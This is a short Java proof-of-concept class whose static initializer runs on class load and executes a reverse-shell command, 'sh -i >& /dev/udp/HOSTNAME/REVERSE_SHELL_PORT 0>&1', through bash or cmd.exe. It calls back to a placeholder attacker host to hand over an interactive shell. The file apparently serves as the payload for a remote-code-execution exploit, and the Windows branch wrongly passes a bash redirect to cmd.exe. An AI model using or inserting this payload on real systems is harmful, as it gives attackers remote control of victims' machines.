public class poc {
    static {
        System.out.println("RCE PoC executed");
        try {
            Runtime.getRuntime()
                    .exec(System.getProperty("os.name").toLowerCase().contains("win")
                            ? new String[] {
                                    "cmd.exe",
                                    "/C",
                                    "sh -i >& /dev/udp/HOSTNAME/REVERSE_SHELL_PORT 0>&1"
                            }
                            : new String[] {
                                    "/bin/bash",
                                    "-c",
                                    "sh -i >& /dev/udp/HOSTNAME/REVERSE_SHELL_PORT 0>&1"
                            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
